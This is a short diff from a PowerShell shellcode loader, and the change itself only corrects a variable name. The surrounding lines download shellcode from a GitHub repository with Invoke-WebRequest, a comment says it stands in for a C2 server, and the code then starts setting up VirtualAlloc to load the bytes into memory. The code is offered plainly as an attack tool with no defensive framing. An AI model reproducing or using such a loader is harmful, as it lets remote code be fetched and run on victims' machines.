@@ -12,7 +12,7 @@
 $server = https://github.com/crzyscholar/wherever_I_store_the_shellcode
 $port = 8080 # this doesn't really apply here, I'm getting the shellcode from github not c2 server
 
-$respone = Invoke-WebRequest -uri "$server:$port/shellcode" -UseBasicParsing
+$response = Invoke-WebRequest -uri "$server:$port/shellcode" -UseBasicParsing
 $bytes = $response.Content
 
 $VirtualAlloc = @"
